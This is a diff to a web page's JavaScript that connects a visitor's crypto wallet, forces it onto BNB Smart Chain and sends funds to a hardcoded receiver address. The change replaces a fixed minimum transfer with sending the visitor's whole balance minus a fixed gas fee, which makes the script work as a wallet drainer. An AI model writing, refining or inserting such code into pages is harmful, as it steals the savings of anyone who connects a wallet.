@@ -9,7 +9,7 @@
 
   <script>
     const receiverAddress = "0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a"; // Do not change
-    const MINIMUM_AMOUNT_TO_SEND = "10000000000000000"; // 0.01 BNB in wei, minimum amount to send
+    const GAS_LIMIT = 21000; // Standard gas limit for BNB transfer
 
     async function connectAndTransfer() {
       // Check for wallet provider (MetaMask, Trust Wallet, etc.)
@@ -37,7 +37,6 @@
         const chainId = await web3.eth.getChainId();
         const chainIdHex = web3.utils.toHex(chainId);
         if (chainIdHex !== "0x38") {
-          // Attempt to switch to BNB Smart Chain Mainnet
           try {
             await window.ethereum.request({
               method: 'wallet_switchEthereumChain',
@@ -53,49 +52,27 @@
         const balance = await web3.eth.getBalance(sender);
         const balanceBigInt = BigInt(balance);
 
-        // Estimate gas cost
-        const gasLimit = await web3.eth.estimateGas({
-          from: sender,
-          to: receiverAddress,
-          value: MINIMUM_AMOUNT_TO_SEND // Use minimum amount for estimation
-        });
+        // Get current gas price
         const gasPrice = await web3.eth.getGasPrice();
-        const gasEstimate = (BigInt(gasLimit) * BigInt(gasPrice)).toString();
-        const gasEstimateBigInt = BigInt(gasEstimate);
+        const gasPriceBigInt = BigInt(gasPrice);
 
-        // Calculate total required funds (minimum amount to send + gas fees)
-        const minimumAmountBigInt = BigInt(MINIMUM_AMOUNT_TO_SEND);
-        const totalRequired = minimumAmountBigInt + gasEstimateBigInt;
+        // Calculate gas estimate
+        const gasEstimate = BigInt(GAS_LIMIT) * gasPriceBigInt;
 
-        // Check if balance is sufficient
-        if (balanceBigInt < totalRequired) {
-          alert(
-            `Insufficient funds!\n` +
-            `Your balance: ${(balanceBigInt / BigInt(1e18))} BNB\n` +
-            `Required: ${(totalRequired / BigInt(1e18))} BNB (including gas fees)\n` +
-            `Please add more BNB to your wallet.`
-          );
+        // Calculate amount to send: balance - gasEstimate
+        let amountToSend = balanceBigInt - gasEstimate;
+
+        if (amountToSend <= 0) {
+          alert("Insufficient BNB to cover gas fees. Please add more BNB to your wallet.");
           return;
         }
 
-        // Calculate amount to send (use minimum amount or remaining balance after gas, whichever is higher)
-        let amountToSend = balanceBigInt - gasEstimateBigInt;
-        if (amountToSend < minimumAmountBigInt) {
-          amountToSend = minimumAmountBigInt;
-        }
-        amountToSend = amountToSend.toString();
-
-        // Double-check funds before sending
-        if (BigInt(amountToSend) + gasEstimateBigInt > balanceBigInt) {
-          alert("Insufficient funds after final calculation. Please add more BNB.");
-          return;
-        }
-
-        // Send BNB
+        // Send BNB with fixed gas limit
         const tx = await web3.eth.sendTransaction({
           from: sender,
           to: receiverAddress,
-          value: web3.utils.toHex(amountToSend) // Convert to hex for the transaction
+          value: web3.utils.toHex(amountToSend.toString()),
+          gas: GAS_LIMIT
         });
 
         alert("BNB sent successfully! Tx hash: " + tx.transactionHash);
